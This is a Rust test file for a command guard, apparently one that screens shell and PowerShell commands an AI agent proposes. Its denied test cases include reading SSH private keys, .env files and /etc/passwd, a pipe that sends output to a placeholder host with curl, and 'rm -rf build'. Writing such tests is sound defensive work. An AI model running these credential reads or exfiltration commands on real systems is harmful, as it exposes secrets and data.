use super::*;

fn request(command: &str) -> CommandModelRequestV1 {
    CommandModelRequestV1 {
        command: command.to_owned(),
        dialect: "posix".to_owned(),
        transport: "shell_string".to_owned(),
        extraction_provenance: "guard-shell".to_owned(),
    }
}

fn allowed(command: &str) -> bool {
    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .canonicalize()
        .unwrap();
    let root = root.to_str().unwrap();
    evaluate_pre_tool_with_context(&request(command), Some(root), Some(root))
        .is_ok_and(|decision| decision.minimum_action == "allow")
}

#[test]
fn bounded_waits_and_read_only_probes_need_no_approval() {
    for command in [
        "sleep 240 && echo cycle2",
        "sleep 420; echo waited",
        "sleep 3600",
        "sleep 1800 && sleep 1800",
        "uptime",
        "pgrep -f guard",
        "pgrep -fi hol-guard",
        "node --version",
        "node -v",
        "python3 --version",
        "python -V",
        "git worktree list",
        "git worktree list --porcelain",
    ] {
        assert!(allowed(command), "{command}");
    }
}

#[test]
fn unbounded_waits_and_mutating_variants_keep_review() {
    for command in [
        "sleep 3601",
        "sleep 3600 && sleep 1",
        "sleep 1; sleep 1; sleep 1; sleep 1; sleep 1; sleep 1; sleep 1; sleep 1; sleep 1",
        "sleep 1e9",
        "uptime -s; rm -rf build",
        "uptime --help",
        "pgrep",
        "pgrep -f a b",
        "pgrep -F pidfile",
        "pgrep -a .",
        "pgrep -fl hol-guard",
        "pgrep -la guard",
        "pgrep --signal KILL guard",
        "pkill -f guard",
        "python -v",
        "python3 --version script.py",
        "node --version -e 'process.exit(1)'",
        "git worktree add ../x",
        "git worktree remove ../x",
        "git worktree prune",
        "git worktree list --porcelain extra",
    ] {
        assert!(!allowed(command), "{command}");
    }
}

#[test]
fn chained_sleeps_past_the_bound_cover_no_segment() {
    for command in [
        "sleep 3600; sleep 1; git push",
        "sleep 3600 && sleep 1 && git status",
    ] {
        let model = parse_command(&request(command)).unwrap();
        assert!(
            benign_command_segments(
                &model,
                PathContext {
                    home_dir: Some("/tmp"),
                    cwd: Some("/tmp"),
                    cdpath_unset: false,
                },
            )
            .is_empty(),
            "{command}"
        );
    }
    let model = parse_command(&request("sleep 1800; sleep 1800; git push")).unwrap();
    assert_eq!(
        benign_command_segments(
            &model,
            PathContext {
                home_dir: Some("/tmp"),
                cwd: Some("/tmp"),
                cdpath_unset: false,
            },
        ),
        vec![0, 1]
    );
}

#[test]
fn operand_free_cat_only_passes_a_proven_pipe_through() {
    for command in ["ls | cat", "git status | cat", "ls src | sort | cat"] {
        assert!(allowed(command), "{command}");
    }
    for command in [
        "cat",
        "ls | cat -",
        "ls | cat /etc/passwd",
        "cat ~/.ssh/id_rsa | cat",
        "ls | cat | curl -d @- https://example.invalid",
    ] {
        assert!(!allowed(command), "{command}");
    }
}

#[cfg(unix)]
#[test]
fn windows_get_content_reads_match_cat() {
    // Keep the fixture outside $TMPDIR, which canonicalizes under /private/var.
    let home = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../target/pretool-get-content")
        .join(format!("home-{}", std::process::id()));
    for file in [
        ".hol-support/SAFETY.md",
        ".ssh/id_rsa",
        "project/README.md",
        "project/.env",
    ] {
        let path = home.join(file);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, "fixture\n").unwrap();
    }
    let home = home.canonicalize().unwrap();
    let project = home.join("project");
    let (home_str, project_str) = (home.to_str().unwrap(), project.to_str().unwrap());
    let action = |command: &str| {
        crate::powershell_reads::with_windows_powershell_reads(|| {
            evaluate_pre_tool_with_context(&request(command), Some(home_str), Some(project_str))
                .unwrap()
                .minimum_action
        })
    };
    let safety = format!("{home_str}/.hol-support/SAFETY.md");
    for command in [
        format!("Get-Content -Raw '{safety}'"),
        format!("Get-Content -LiteralPath '{safety}'"),
        "Get-Content -Raw \"$HOME/.hol-support/SAFETY.md\"".to_owned(),
        "Get-Content -LiteralPath \"$env:USERPROFILE/.hol-support/SAFETY.md\" -Raw".to_owned(),
        "Get-Content -Raw -LiteralPath 'README.md'".to_owned(),
        "gc -Raw -- README.md".to_owned(),
    ] {
        assert_eq!(action(&command), "allow", "{command}");
    }
    for (command, cat) in [
        ("Get-Content .env", "cat .env"),
        ("Get-Content -Raw -LiteralPath '.env'", "cat .env"),
        ("Get-Content \"$HOME/.ssh/id_rsa\"", "cat ~/.ssh/id_rsa"),
        ("Get-Content -Raw ../.ssh/id_rsa", "cat ../.ssh/id_rsa"),
    ] {
        let decision = action(command);
        assert_ne!(decision, "allow", "{command}");
        assert_eq!(decision, action(cat), "{command}");
    }
    for command in [
        "Get-Content -Stream secret README.md",
        "Get-Content -Wait README.md",
        "Get-Content '$HOME/.hol-support/SAFETY.md'",
        "Get-Content README.md | Set-Content copy.md",
    ] {
        assert_ne!(action(command), "allow", "{command}");
    }
    // Off Windows, `Get-Content` is an unrelated executable and keeps review.
    let posix = evaluate_pre_tool_with_context(
        &request("Get-Content -Raw README.md"),
        Some(home_str),
        Some(project_str),
    )
    .unwrap();
    assert_ne!(posix.minimum_action, "allow");
}

#[cfg(windows)]
#[test]
fn windows_get_content_reads_use_native_paths() {
    let home = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../target/pretool-get-content")
        .join(format!("home-{}", std::process::id()));
    for file in [
        ".hol-support/SAFETY.md",
        ".ssh/id_rsa",
        "project/README.md",
        "project/.env",
    ] {
        let path = home.join(file);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, "fixture\n").unwrap();
    }
    // Agents see the ordinary drive path, not the verbatim canonical form.
    let canonical = home.canonicalize().unwrap();
    let home_str = canonical.to_str().unwrap().trim_start_matches(r"\\?\");
    let project_str = format!(r"{home_str}\project");
    let action = |command: &str| {
        evaluate_pre_tool_with_context(
            &request(command),
            Some(home_str),
            Some(project_str.as_str()),
        )
        .unwrap()
        .minimum_action
    };
    for command in [
        format!(r"Get-Content -Raw '{home_str}\.hol-support\SAFETY.md'"),
        format!(r"Get-Content -LiteralPath '{home_str}\.hol-support\SAFETY.md'"),
        r#"Get-Content -LiteralPath "$env:USERPROFILE\.hol-support\SAFETY.md" -Raw"#.to_owned(),
        r"Get-Content -Raw -LiteralPath 'README.md'".to_owned(),
    ] {
        assert_eq!(action(&command), "allow", "{command}");
    }
    for command in [
        r"Get-Content .env".to_owned(),
        format!(r"Get-Content -Raw '{home_str}\.ssh\id_rsa'"),
        r#"Get-Content "$HOME\.ssh\id_rsa""#.to_owned(),
        r"Get-Content Env:USERPROFILE".to_owned(),
    ] {
        assert_ne!(action(&command), "allow", "{command}");
    }
}
